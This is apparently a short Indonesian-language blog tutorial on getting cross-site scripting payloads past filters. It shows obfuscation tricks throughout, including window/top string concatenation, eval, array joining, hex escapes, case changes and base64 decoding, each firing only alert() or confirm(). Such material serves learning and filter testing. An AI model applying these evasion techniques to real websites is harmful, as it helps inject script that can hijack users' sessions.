# :globe_with_meridians: Teknik Bypass Filter Xss B930Dc52C1Fe

---

Selain payload diatas, masih banyak lagi payload-payload sederhana yang digunakan dalam serangan XSS (Cross Site Scripting). Tapi bagaimana jika payload sederhana tersebut ditolak atau sudah difilter? Berikut beberapa teknik yang bisa dicoba untuk melewati (bypass) filter-filter payload XSS

Sebelum mencoba beberapa filter dibawah ini, alangkah lebih baik jika memahami sedikit tentang HTML dan [Javascript](https://www.javascript.com/).

## Beberapa Teknik Yang Bisa Dicoba Untuk Bypass Filter XSS

## - Bypass dengan window atau top

objek *window* dan *top *bisa dimanfaatkan untuk membypass payload yang sudah difilter, misalnya alert()

Payload yang difilter:

`<script>alert</script>`

Bypass:

`<script>window['al'+'ert']()</script>`

`<script>top[`alert`]()</script>`

## - Bypass dengan eval

function eval() bisa dimanfaatkan untuk membypass payload yang sudah difilter

## Get Revan A’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

Payload yang difilter:

`<img src=x onerror="js:alert()" />`

Bypass:

`<img src=x onerror="js:abc='al'+'ert()';eval(abc)" />`

## - Bypass dengan array

Array juga bisa dimanfaatkan untuk membypass payload yang difilter

Payload yang difilter:

`<script>alert()</script>`

`<script>confirm()</script>`

Bypass:

`<script>window[['a','l','e','r','t'].toString().replaceAll(',',"")]()</script>`

`<script>window[['conf','irm'].toString().replaceAll(',',"")]()</script>`

Beberapa teknik diatas juga bisa dimodifikasi dengan teknik lain. Misalnya Camel Case, Base64, HTML Encode, URL Encode, Hexadecimal, Octal, dan Beberapa teknik javascript yang lain. berikut contohnya…

- `<script>abc='\x61\x6C\x65\x72\x74';this[abc]()</script>`

- `<script>window['\x61\x6C\x65\x72\x74']()</script>`

- `<script>window[['\x61\x6C\x65\x72\x74'].toString().replaceAll(",","")]()</script>`

- `<script>abc='aLerT()';eval(abc.toLowerCase())</script>`

- `<script>abc='YWxlcnQoKQ==';eval(atob(abc))</script>`

- `<script>abc='CoNFirM()';eval(abc.toLowerCase())</script>`

Semoga artikel ini bisa membantu dalam mempelajari serangan XSS. Mohon maaf jika ada yang kurang tepat dari penjelasan diatas dan ada kalimat yang sulit untuk dipahami. Terima kasih ^^

---
